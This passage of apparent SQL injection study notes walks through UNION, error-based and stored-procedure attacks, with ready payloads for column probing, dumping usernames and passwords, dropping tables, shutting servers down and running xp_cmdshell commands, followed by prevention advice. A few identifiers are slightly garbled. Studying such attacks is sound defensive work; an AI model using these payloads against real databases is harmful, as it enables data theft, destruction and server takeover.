class="language-plaintext highlighter-rouge">; shutdown with nowait; --</code><li>Password: <code class="language-plaintext highlighter-rouge">[Leave blank]</code></ul><li>If the SQL server is vulnerable, the following statement will be executed:<ul><li><code class="language-plaintext highlighter-rouge">SELECT Username FROM Users Where username= ‘ ; shutdown with nowait; -- ’ and user_Pass=' '</code></ul></ul><hr /><h3 id="lack-of-strong-typing">Lack of Strong Typing</h3><p>Another form of SQL injection takes advantage of the SQL developer not having incorporated strong typing into program.</p><p>when program is expecting a variable of one type or different type is entered, an SQL injection attack can be effected.</p><p>Example: the variable Employeenum is expected to be a number.</p><ul><li><code class="language-plaintext highlighter-rouge">SELECT Employeename FROM Emptable WHERE Employeenum = '';</code></ul><p>If a character string is inserted instead, the database could be manipulated.</p><ul><li>Setting the Employeenum variable: <code class="language-plaintext highlighter-rouge">l; DROP TABLE Emptable</code><li><code class="language-plaintext highlighter-rouge">SELECT Employeename FROM Emptable WHERE Employeenum = l; DROP TABLE Emptable;</code><li>This SQL statement will erase the table Emptable from the database.</ul><hr /><h3 id="sql-injection-union-attacks">SQL injection UNION attacks</h3><p>provide database records other than those specified in a valid SQL statement</p><ul><li>will return data from multiple tables in the database with one query.<li>Example:<ul><li><code class="language-plaintext highlighter-rouge">SELECT Broker FROM BrokerList WHERE 1 = 1 UNION ALL SELECT Broker FROM BanksList WHERE 1 = 1;</code><li>This UNION statement will provide the broker names in list of brokers in the ﬁrst query and the records from the table containing the name of banks providing brokerage services from the UNION statement.<li><code class="language-plaintext highlighter-rouge">SELECT a, b FROM table1 UNION SELECT c, d FROM table2</code></ul></ul><p>For a <code class="language-plaintext highlighter-rouge">UNION</code> query to work, two key requirements must be met:</p><ul><li>The individual queries must return the same number of columns.<li>The data types in each column must be compatible between the individual queries.</ul><p>To carry out an SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out:</p><ul><li>How many columns are being returned from the original query?<li>Which columns returned from the original query are of a suitable data type to hold the results from the injected query?</ul><hr /><h4 id="find-number-of-columns-with-sql-injection-union-attack">Find number of columns with SQL injection UNION attack</h4><p>When performing an SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.</p><p>The first method</p><ul><li>injecting a series of <code class="language-plaintext highlighter-rouge">ORDER BY</code> clauses and incrementing the specified column index until an error occurs.<li>For example, assuming the injection point is a quoted string within the <code class="language-plaintext highlighter-rouge">WHERE</code> clause of the original query, you would submit:</ul><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.

https://abc.net/filter?category=Lifestyle
https://abc.net/filter?category=Lifestyle' ORDER BY 3--
</pre></table></code></div></div><ul><li>This series of payloads modifies the original query to order the results by different columns in the result set.<ul><li>The column in an <code class="language-plaintext highlighter-rouge">ORDER BY</code> clause can be specified by its index, so you don’t need to know the names of any columns.<li>When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:<li><code class="language-plaintext highlighter-rouge">The ORDER BY position number 3 is out of range of the number of items in the select list.</code></ul><li>The application might actually return the database error in its HTTP response, or it might return a generic error, or simply return no results.<li>Provided you can detect some difference in the application’s response, you can infer how many columns are being returned from the query.</ul><p>The second method</p><ul><li>submitting a series of <code class="language-plaintext highlighter-rouge">UNION SELECT</code> payloads specifying a different number of null values:</ul><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.

GET /filter?category=Corporate+gifts'+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1
</pre></table></code></div></div><ul><li>If the number of nulls does not match the number of columns, the database returns an error, such as:<li><code class="language-plaintext highlighter-rouge">All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.</code></ul><p>the application might return this error message, or return a generic error or no results.</p><ul><li>When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column.<li>The effect on the resulting HTTP response depends on the application’s code.<li>If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table.<li>Otherwise, the null values might trigger a different error, such as a <code class="language-plaintext highlighter-rouge">NullPointerException</code>.<li>Worst case, the response might be indistinguishable from that which is caused by an incorrect number of nulls, making this method of determining the column count ineffective.</ul><blockquote><p>Note:</p><ul><li>The reason for using <code class="language-plaintext highlighter-rouge">NULL</code> as the values returned from the injected <code class="language-plaintext highlighter-rouge">SELECT</code> query<li>the data types in each column must be compatible between the original and the injected queries.<li>Since <code class="language-plaintext highlighter-rouge">NULL</code> is convertible to every commonly used data type, using <code class="language-plaintext highlighter-rouge">NULL</code> maximizes the chance that the payload will succeed when the column count is correct. *<li>On Oracle, every <code class="language-plaintext highlighter-rouge">SELECT</code> query must use the <code class="language-plaintext highlighter-rouge">FROM</code> keyword and specify a valid table.<li>There is a built-in table on Oracle called <code class="language-plaintext highlighter-rouge">DUAL</code> which can be used for this purpose.<li>So the injected queries on Oracle would need to look like: <code class="language-plaintext highlighter-rouge">' UNION SELECT NULL FROM DUAL--</code>.<li>The payloads described use the double-dash comment sequence <code class="language-plaintext highlighter-rouge">--</code> to comment out the remainder of the original query following the injection point. * On MySQL, the double-dash sequence must be followed by a space.<li>Alternatively, the hash character <code class="language-plaintext highlighter-rouge">#</code> can be used to identify a comment.</ul></blockquote><hr /><h4 id="find-columns-with-a-useful-data-type-in-an-sql-injection-union-attack">Find columns with a useful data type in an SQL injection UNION attack</h4><p>The reason for performing an <code class="language-plaintext highlighter-rouge">SQL injection UNION attack</code> is to be able to retrieve the results from an injected query.</p><ul><li>Generally, the interesting data that you want to retrieve will be in string form, so you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.<li>Having already determined the number of required columns<li>now probe each column to test whether it can hold string data<ul><li>by submitting a series of <code class="language-plaintext highlighter-rouge">UNION SELECT</code> payloads<li>that place a string value into each column in turn.</ul></ul><p>For example, if the query returns four columns, you would submit:</p><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
</pre></table></code></div></div><ul><li>If the data type of a column is not compatible with string data, the injected query will cause a database error, such as:<ul><li><code class="language-plaintext highlighter-rouge">Conversion failed when converting the varchar value 'a' to data type int.</code></ul><li>If an error does not occur, and the application’s response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.</ul><hr /><h4 id="retrieve-interesting-data-by-sql-injection-union-attack-to">retrieve interesting data by SQL injection UNION attack to</h4><ol><li>after determined the number of columns returned by the original query<li>found which columns can hold string data,<li>you are in a position to retrieve interesting data.</ol><p>Suppose that:</p><ul><li>The original query returns two columns, both of which can hold string data.<li>The injection point is a quoted string within the <code class="language-plaintext highlighter-rouge">WHERE</code> clause.<li><p>The database contains a table called <code class="language-plaintext highlighter-rouge">users</code> with the columns <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code>.</p><li>to retrieve the contents of the <code class="language-plaintext highlighter-rouge">users</code> table by submitting the input:<ul><li><code class="language-plaintext highlighter-rouge">' UNION SELECT username, password FROM users--</code></ul><li>the crucial information needed to perform this attack is that there is a table called <code class="language-plaintext highlighter-rouge">users</code> with two columns called <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code>.</ul><hr /><h4 id="querying-the-database-type-and-version">Querying the database type and version</h4><p>Different databases provide different ways of querying their version. You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software.</p><p>The queries to determine the database version for some popular database types are as follows:</p><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>| Database type    | Query                   |
| ---------------- | ----------------------- |
| Microsoft, MySQL | SELECT @@version        |
| Oracle           | SELECT * FROM v$version |
| PostgreSQL       | SELECT version()        |
</pre></table></code></div></div><hr /><h4 id="listing-the-contents-of-the-database">Listing the contents of the database</h4><ul><li>query <code class="language-plaintext highlighter-rouge">information_schema.tables</code> to list the tables in the database:</ul><p><code class="language-plaintext highlighter-rouge">SELECT * FROM information_schema.tables</code></p><p>This returns output like the following:</p><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
| ------------- | ------------ | ---------- | ---------- |
| MyDatabase    | dbo          | Products   | BASE TABLE |
| MyDatabase    | dbo          | Users      | BASE TABLE |
| MyDatabase    | dbo          | Feedback   | BASE TABLE |
</pre></table></code></div></div><ul><li>query <code class="language-plaintext highlighter-rouge">information_schema.columns</code> to list the columns in individual tables:</ul><p><code class="language-plaintext highlighter-rouge">SELECT * FROM information_schema.columns WHERE table_name = 'Users'</code></p><p>This returns output like the following:</p><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | TABLE_TYPE |
| ------------- | ------------ | ---------- | ----------- | ---------- |
| MyDatabase    | dbo          | Users      | UserId      | int        |
| MyDatabase    | dbo          | Users      | Username    | varchar    |
| MyDatabase    | dbo          | Users      | Password    | varchar    |
</pre></table></code></div></div><hr /><h4 id="equivalent-to-information-schema-on-oracle">Equivalent to information schema on Oracle</h4><ul><li>list tables by querying all_tables:<ul><li><code class="language-plaintext highlighter-rouge">SELECT * FROM all_tables</code></ul><li>list columns by querying all_tab_columns:<ul><li><code class="language-plaintext highlighter-rouge">SELECT * FROM all_tab_columns WHERE table_name = 'USERS'</code></ul></ul><hr /><h4 id="retrieving-multiple-values-within-a-single-column">Retrieving multiple values within a single column</h4><ul><li>instead that the query only returns a single column.<li>can easily retrieve multiple values together within this single column by concatenating the values together,<li>ideally including a suitable separator to let you distinguish the combined values.<li>For example<ul><li>on Oracle you could submit the input:<li><code class="language-plaintext highlighter-rouge">' UNION SELECT username || '~' || password FROM users--</code><li>the double-pipe sequence <code class="language-plaintext highlighter-rouge">||</code>: a string concatenation operator on Oracle.<li>The injected query concatenates together the values of the <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code> fields, separated by the <code class="language-plaintext highlighter-rouge">~</code> character.</ul></ul><p>The results from the query will let you read all of the usernames and passwords, for example:</p><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>...
administrator~s3cure
wiener~peter
carlos~montoya
...
</pre></table></code></div></div><hr /><p>The use of a LIKE clause, another method of SQL injection</p><ul><li>Example:<li>inserting wildcard characters (like %),<ul><li>Then, the WHERE clause = TRUE when the argument strPartName is included as part of a part name:<li>Then, all parts names include the string <code class="language-plaintext highlighter-rouge">abc</code> will be returned.<li><code class="language-plaintext highlighter-rouge">SELECT PartCost, PartName FROM PartsList WHERE PartName LIKE '%abc%';</code></ul><li>employ the wildcard symbol to guess the admin username:<ul><li>querying with <code class="language-plaintext highlighter-rouge">ad%</code>.</ul></ul><hr /><p>incorporating the UNION and LIKE statements is to use the <strong>ODBC error message</strong> to gather information from the database.</p><p>Example 1:</p><ul><li>the page <code class="language-plaintext highlighter-rouge">http://page/index.asp?id=20</code>.<li>use the UNION statement to set up a query as follows:<ul><li><code class="language-plaintext highlighter-rouge">http://page/index.asp?id=20 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES --</code><ul><li><kbd>Information_Schema Tables</kbd>: hold data on all the tables in the server database<li><kbd>Table Name</kbd> field: holds name of each table in the database.</ul></ul><li>This string attempts to UNION the integer 20 with another string from the database.<ul><li><code class="language-plaintext highlighter-rouge">SELECT</code>: provide the name of the ﬁrst table in the database<li><code class="language-plaintext highlighter-rouge">UNION</code>: result in the SQL server attempting to convert a character string to integer.</ul><li>This conversion will fail, error message will be return and provides the information:<ul><li>the string could not be converted to an integer<li>provides the name of the first table in the database, namely employeetable.</ul></ul><blockquote><p>Microsoft OLE DB Provider for ODBC Drivers error ‘80040e07‘ [Microsoft] [ODBC SQL Server Driver] [SQL Server]Syntax error converting the nvarchar value ‘employeetable’ to a column of data type int. /index.asp, line 6</p></blockquote><ul><li>Then using the following statement,<ul><li><code class="language-plaintext highlighter-rouge">http://page/index.asp?id=20 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME not IN ('employeetable') --</code><li>the name of the next table in the database tables will be returned</ul></ul><p>Example 2:</p><ul><li>use the LIKE keyword in the following statement, additional information can be found:<ul><li><code class="language-plaintext highlighter-rouge">http://page/index.asp?id=20 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%25 login%25'--</code><li>The term <code class="language-plaintext highlighter-rouge">'%25login%25'</code>: will be interpreted as <code class="language-plaintext highlighter-rouge">%login%</code> by the server.<li>The resulting <strong>ODBC error message</strong> would be:<ul><li>The ODBC error message identifies a table name as <code class="language-plaintext highlighter-rouge">sys_login</code>.</ul></ul></ul><blockquote><p>Microsoft OLE DB Provider for ODBC Drivers error ‘80040e07’ [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value ‘sys_login’ to a column of data type int. /index.asp, line 6</p></blockquote><ul><li>The next step, obtain a <code class="language-plaintext highlighter-rouge">login_name</code> from the <code class="language-plaintext highlighter-rouge">sys_login table</code>:<ul><li><code class="language-plaintext highlighter-rouge">http://page/index.asp?id=20 UNION SELECT TOP 1 login_name FROM sys_login --</code><li>The resulting <strong>ODBC error message</strong>:<ul><li>provides the login name <code class="language-plaintext highlighter-rouge">whiteknight</code> from the <code class="language-plaintext highlighter-rouge">sys_login</code> table</ul></ul></ul><blockquote><p>Microsoft OLE DB Provider for ODBC Drivers error ‘80040e07’ [Microsoft][ODBC SQL Server Driver][SQL ServerJSyntax error converting the nvarchar value ‘whiteknight’ to a column of data type int. /index.asp, line 6</p></blockquote><ul><li>To obtain the password for whiteknight:<ul><li><code class="language-plaintext highlighter-rouge">http://page/index.asp?id=20 UNION SELECT TOP 1 password FROM sys_login where login_name='whiteknight' --</code><li>The corresponding <strong>ODBC error message</strong>: gives the password for whiteknight is revealed: <code class="language-plaintext highlighter-rouge">rlkfoo3</code>.</ul></ul><blockquote><p>Microsoft OLE DB Provider for ODBC Drivers error ‘80040907’ [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value ‘rlkfooB’ to a column of data type int. /index.asp, line 6</p></blockquote><hr /><h3 id="acquiring-table-column-names">Acquiring Table Column Names</h3><p>Once table identified, obtaining the column names provides valuable information concerning the table and its contents.</p><p>Examples:</p><ul><li>acquire column names by accessing the database table <code class="language-plaintext highlighter-rouge">INFORMATION_SCHEMA.COLUMNS</code>.<li>The injection attack begins with the URL:<ul><li><code class="language-plaintext highlighter-rouge">http://page/index.asp?id=20 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME= 'parts' --</code><li>The corresponding <strong>ODBC error message</strong>: gives the first column name in <code class="language-plaintext highlighter-rouge">Parts</code> table as <code class="language-plaintext highlighter-rouge">partnum</code></ul></ul><blockquote><p>Microsoft OLE DB Provider for ODBC Drivers error ‘80040e07‘ [Microsoft] [ODBC SQL Server Driver] [SQL ServerJSyntax error converting the nvarchar value ‘partnum’ to a column of data type int. /index.asp, line 6</p></blockquote><ul><li>To obtain, the second column name, the expression <code class="language-plaintext highlighter-rouge">not IN ()</code> can be applied as shown:<ul><li><code class="language-plaintext highlighter-rouge">http://page/index.asp?id=20 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME= 'parts' WHERE COLUMN_NAME not IN ('partnum') --</code><li>The corresponding <strong>ODBC error message</strong>: provides the next column name as <code class="language-plaintext highlighter-rouge">partcost</code>.</ul></ul><blockquote><p>Microsoft OLE DB Provider for ODBC Drivers error ‘80040907‘ [Microsoft] [ODBC SQL Server Driver] [SQL ServerJSyntax error converting the nvarchar value ‘partcost‘ to a column of data type int. /index.asp, line 6</p></blockquote><p>In this manner, all the remaining columns in the table can be found.</p><hr /><h2 id="automated-sql-injection-tools">Automated SQL Injection Tools</h2><p>A series of automated tools for finding SQL injection vulnerabilities and SQL injection attacks.</p><p>popular SQL injection tools：</p><p><strong>Absinthe</strong></p><ul><li>an automated tool<li>to implement SQL injections and retrieve data from a web server database.<li>The Absinthe screen interface supports entering target data, such as the URL, Web application injectable parameters, cookies, delays, speedups, and injection options.</ul><p><img data-proofer-ignore data-src="https://i.imgur.com/Byivv9Y.jpg" alt="Pasted Graphic" /></p><p><strong>Automagic SQL</strong></p><ul><li>an automated injection tool<li>against Microsoft SQL server that supports applying xp_cmdshell, uploading database files, and identifying and browsing tables in the database.</ul><p><strong>Osql</strong></p><ul><li>replaced by sqlcmd, it is good to be aware of it.<li>Osql interacts with a web server using ODBC and supports entering script files, Transact-SQL statements, and system procedures to the server database.</ul><p><strong>sqlcmd</strong></p><ul><li>This utility supports entering Transact-SQL statement, script files, and system procedures in SQLCMD mode. It replaces Osql utility functions.</ul><p><strong>SQLDict</strong></p><ul><li>application developed on Visual FoxPro 8.0 and supports the access of a variety of relational databases.<li>It provides a common interface to execute SQL commands, implement and test for dictionary attacks, browse and list database tables, display table attributes, and export table attributes.</ul><p><strong>SQLExec</strong></p><ul><li>This database utility can be used with a variety of servers to display database tables and fields and generate SQL commands for different functions.<li>An SQLEXEC ( ) function in Visual FoxPro sends and executes an SQL command to a data source.</ul><p><strong>SQLbf</strong></p><ul><li>An SQL server brute force / dictionary password cracker<li>can be used to decrypt a password file or guess a password.<li>can also be used to evaluate the strength of Microsoft SQL Server passwords ofﬂine.</ul><p><strong>SQLSmack</strong></p><ul><li>A Linux-based tool<li>it can execute remote commands on Microsoft SQL server.<li>The commands are executed through the master.Xp_cmdshell but require a valid username and password.</ul><p><strong>SSRS</strong></p><ul><li>Microsoft SQL Server Resolution Service is susceptible to buffer overﬂow attacks which can lead to the server executing arbitrary code, elevating privileges, and compromising the web server and database.</ul><p><strong>SQL2.exe</strong></p><ul><li>This UDP buffer overﬂow remote hacking tool<li>sends a crafted packet to UDP port 1434 on the SQL Server 2000 Resolution Service.<li>The buffer overﬂow can result in the execution of malicious code in the server using the xp_cmdshell stored procedure.</ul><p>for vulnerabilities:</p><p><strong>SQLBlock</strong></p><ul><li>This utility functions as an ODBC data source and inspects SQL statements to protect access to Web server databases.<li>block dangerous and potentially harmful SQL statements and alert the system administrator.</ul><p><strong>Acunetix Web Vulnerability Scanner (WVS)</strong></p><ul><li>automated scanner<li>can work in conjunction with manual utilities to analyze Web applications for vulnerabilities<li>can be used for penetration testing.</ul><p><strong>WSDigger</strong></p><ul><li>an open source black box penetration testing Web services framework<li>can test for cross site scripting, SQL injection and other types of attack vulnerabilities.</ul><p><strong>WebInspect</strong></p><ul><li>automated tool<li>can be used to identify Web application vulnerabilities by dynamically scanning these applications.<li>As part of WebInspect’s vulnerability analysis, this utility will check for and report SQL injection vulnerabilities.</ul><hr /><h2 id="sql-injection-prevention-and-remediation">SQL Injection Prevention and Remediation</h2><p>SQL injection:</p><ul><li>attack a web server database, compromise critical information,<li>expose the server and the database to a variety of malicious exploits;</ul><p>Measures to mitigate SQL injection attacks.</p><ul><li>does not guarantee that SQL injection can be completely eliminated,<li>but make it more difficult for hackers to conduct these attacks.</ul><p>Defend attack:</p><ul><li><strong>privilege</strong>:<ul><li>Check for <code class="language-plaintext highlighter-rouge">accounts with weak / old passwords</code><li><code class="language-plaintext highlighter-rouge">Eliminate unnecessary accounts</code><li>Monitor logging procedures.<li>Practice the <code class="language-plaintext highlighter-rouge">principle of least privilege regarding access to the database</code>.<ul><li>not connecting the user to the database with the privileges of an owner of the database or of a superuser.</ul><li>Run database applications from a low-privilege account.<li>Set security privileges on the database to the least needed.</ul><li>Ensure that <strong>patches on the server are up to date</strong> and properly installed.<li><strong>Append and prefix quotes</strong> to all client inputs.<li><strong>Limit the use of dynamic SQL queries</strong>, if possible.<li><p><strong>Limit user inputs to one query</strong>, preventing multi-statement attacks.</p><li><strong>Input validation / filter input</strong>. Server side validation.<ul><li>Allow <code class="language-plaintext highlighter-rouge">only known good input</code>, remove bad elements.<li>May use white listing, list of text allowed.<li><code class="language-plaintext highlighter-rouge">Sanitize client-supplied input</code> by filtering data according to least privilege, beginning with numbers and letters.<ul><li>If it is necessary to include symbols, they should be converted to HTML substitutes.</ul><li>Check to <code class="language-plaintext highlighter-rouge">make sure numeric inputs are integers</code> before passing them to SQL queries.<li>Screen input strings from users and URL parameters to eliminate single and double quotes, semicolons, back slashes, slashes, and similar characters.<li>Use bound parameters to create an SQL statement with placeholders such as <code class="language-plaintext highlighter-rouge">?</code> for each parameter, compile the statements, and execute the compilation later with actual parameters.</ul><li><strong>Proper error handling</strong><ul><li>Instead of showing the errors, customized database server error messages, simply present a <code class="language-plaintext highlighter-rouge">generic error web page that doesn’t provide any details</code>.<li>prevents the attacker from gaining information from these errors.</ul><li><strong>Stored procedures / parameterized queries</strong><ul><li>use parameterized queries instead of string concatenation within the query.<li>The stored procedure performs data validation, it handles the parameter (the inputted data) differently and prevents a SQL injection attack.<li>the user can’t manipulate the string in the program.<ul><li>Not copying the input directly into statement,<li>Values sent from the user side become parameters passed into the queries<ul><li><code class="language-plaintext highlighter-rouge">the input is passed to the stored procedure as a parameter</code>.</ul><li>so comment characters won’t eliminate the rest of the query string .<li>anything that tries to insert SQL statements by manipulating the quoting won’t work<li>because the behavior as a parameter is different from just inserting text into a string value.</ul><li>can be use for<ul><li><code class="language-plaintext highlighter-rouge">WHERE INSERT UPDATE</code><li><code class="language-plaintext highlighter-rouge">Table and column name</code> <code class="language-plaintext highlighter-rouge">ORDER BY</code> need other method, such as whitelist permitted input…</ul><li>SQL statements written and stored on the database, can be called by applications.<li>a group of SQL statements that execute as a whole, like a mini-program.<li>database developers often use stored procedures with dynamic web pages.<li>parameterized stored procedure accepts input data as parameter.<ul><li>Employ <code class="language-plaintext highlighter-rouge">needed stored procedures with embedded parameters through safe callable interfaces</code>.<li><code class="language-plaintext highlighter-rouge">Remove stored procedures that are not needed</code>.<ul><li>Candidates include:<li><code class="language-plaintext highlighter-rouge">xp_sendmail</code><li><code class="language-plaintext highlighter-rouge">sp_makewebtask</code><li><code class="language-plaintext highlighter-rouge">master..xp_cmdshell</code><li><code class="language-plaintext highlighter-rouge">xp_startrnail</code></ul><li>Set appropriate privileges for stored procedures</ul><li>The stored procedure performs data validation, it handles the parameter (the inputted data) differently and prevents a SQL injection attack.<li>Example:<ul><li>searching for a book:<ul><li><code class="language-plaintext highlighter-rouge">Darril Gibson’; SELECT * From Customers;--</code></ul><li>The web app passes this search string to a <strong>stored procedure</strong>.<li>The stored procedure uses the search string in a SELECT statement like this:<ul><li>SELECT * From Books Where Author = <code class="language-plaintext highlighter-rouge">"Darril Gibson’; SELECT * From Customers;--”</code></ul><li>interpreted as harmless text rather than malicious SQL statements.<li>It will look for books with name: <code class="language-plaintext highlighter-rouge">Darril Gibson’; SELECT * From Customers;--</code>.<li>Books don’t have names with SELECT statements embedded in them, so the query comes back empty.</ul><li>Not Code signing: it is for code injection.</ul></ul><p>Depending on how well the database server is locked down (or not), SQL injection attacks may allow the attacker to access the structure of the database, all the data, and even modify data.</p><ul><li>In some cases, attackers have modified the price of products from several hundred dollars to just a few dollars, purchased several of them, and then returned the price to normal.</ul><hr /><h3 id="stored-procedures">Stored Procedures</h3><p>Stored procedure:</p><ul><li>group of SQL statements that is designed to perform a specific task.<li>This approach is an alternative to having the <code class="language-plaintext highlighter-rouge">application layer construct SQL statements dynamically</code>.<li>A stored procedure can be <code class="language-plaintext highlighter-rouge">called by its name and pass the required parameters to the procedure</code>.</ul><blockquote><p>SQL injection can also use stored procedures in a web server database.</p><ul><li>SQL injection can be initiated if the stored procedure is not employed properly.</ul></blockquote><p>One useful procedure: <code class="language-plaintext highlighter-rouge">master.dbo.xp_cmdshe11</code>, incorporates follow syntax:</p><ul><li><code class="language-plaintext highlighter-rouge">xp_cmdshell ( 'Command_string’ ) [, no_output]</code><li>The argument <code class="language-plaintext highlighter-rouge">' command_string'</code> is an SQL command.</ul><p>Example:</p><ul><li>following construction provides employee info from an employee name search:<ul><li>CREATE PROCEDURE SP_EmployeeSearch @Employeename varchar(200) = NULL AS<li>DECLARE @sql nvarchar(2000)<li>SELECT @sql = ‘ SELECT EmloyeeNum, EmployeeName, Title, Salary ‘ + ‘ FROM Employee Where ‘<li>IF @EmployeeName IS not NULL<li>SELECT @sql = @sql + ‘ EmployeeName LIKE ‘ ‘ ‘ + @employeename + ‘ ‘ ‘ ‘<li><p>EXEC (@sql)</p><li>In this procedure, the user provides the @employeename variable as input, which is then concatenated 连接的 with @sql.</ul><li>An SQL injection can be initiated by the user if he or she substitutes 1’ or ‘1’=‘1’ ;exec master.dbo.xp_cmdshell ‘dir’ – for the @employeename variable.<ul><li>If this substitution is made, the SQL statement executed will be as follows:<li>SELECT EmployeeNum, EmployerNumber, ,EmployeeName FROM Employee Where EmployeeName LIKE ‘1’ or ‘1’=‘1’;exec master.dbo.xp_cmdshell ‘dir’ –<li>The result of this SQL query: access to all rows from the employee table.</ul></ul><p>Another effective stored procedure in SQL injections: master.dbo.sp_makewebtask:</p><ul><li>produces an SQL statement and an output file location.<li>The syntax for master.dbo.sp_makewebtask is:<ul><li>sp_makewebtask [@outputfile =] ‘outputfile’, [@query =] ‘query’</ul></ul><p><img data-proofer-ignore data-src="https://i.imgur.com/KfXpQHP.png" alt="Screen Shot 2020-11-19 at 01.49.08" /></p><p><img data-proofer-ignore data-src="https://i.imgur.com/chM5COm.png" alt="Screen Shot 2020-11-19 at 01.50.37" /></p><hr /><h3 id="extended-stored-procedures">Extended Stored Procedures</h3><p>Extended stored procedures:</p><ul><li>extend the functions available in the SQL Server environment<li>and are useful in setting up and maintaining the database.<li>Because of vulnerabilities in some of these procedures, these programs can be called to initiate and support SQL injection attacks.</ul><p>A listing of some of these extended procedures is given as follows:</p><ul><li><code class="language-plaintext highlighter-rouge">xp_availablemedia</code>: Provides a list of available computer drives<li><code class="language-plaintext highlighter-rouge">xp_dirtree</code>: Provides a directory tree<li><code class="language-plaintext highlighter-rouge">xp_enumdsn</code>: Identifies server ODBC data sources<li><code class="language-plaintext highlighter-rouge">xp_loginconfig</code>: Provides server security mode data<li><code class="language-plaintext highlighter-rouge">xp_mkecab</code>: Supports user generation of a compressed archive of files on the server and files that can be accessed by the server<li><code class="language-plaintext highlighter-rouge">exec master..xp_cmdshell 'dir ' </code>: Provides a listing of the SQL Server process current working directory<li><code class="language-plaintext highlighter-rouge">exec master..xp_cmdshell 'net1 user ‘</code>: Provides a list of all computer users<li><code class="language-plaintext highlighter-rouge">Custom extended stored procedures</code>: Can also be developed to execute as part of the SQL server code</ul><hr /><h3 id="sewer-system-tables">Sewer System Tables</h3><p>It is helpful to know which system tables in the database server can be used as targets in SQL injection.</p><p>Summarizes the tables for 3 common database servers:</p><p>Sewer Database Tables</p><div class="table-wrapper"><table><thead><tr><th>ORACLE<th>MS ACCESS<th>MS SQL<tbody><tr><td>SYS.USER_CATALOG<td>MSysACEs<td>syscolumns<tr><td>SYS.USER_CONSTRAINTS<td>MsysQueries<td>sysobjects<tr><td>SYS.USER_OBJECTS SYS.TAB<td>MsysObjects<td> <tr><td>SYS.USER_TAB_COLUMNS<td>MSysRelationships<td> <tr><td>SYS.USER_TABLES<td> <td> <tr><td>SYS.USER_TRIGGERS<td> <td> <tr><td>SYS.USER_VIEWS SYS.ALL_TABLES<td> <td> </table></div><p>.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/10cyberattack/'>10CyberAttack</a>, <a href='/categories/injection/'>Injection</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/cyberattack/" class="post-tag no-text-decoration" >CyberAttack</a> <a href="/tags/injection/" class="post-tag no-text-decoration" >Injection</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by 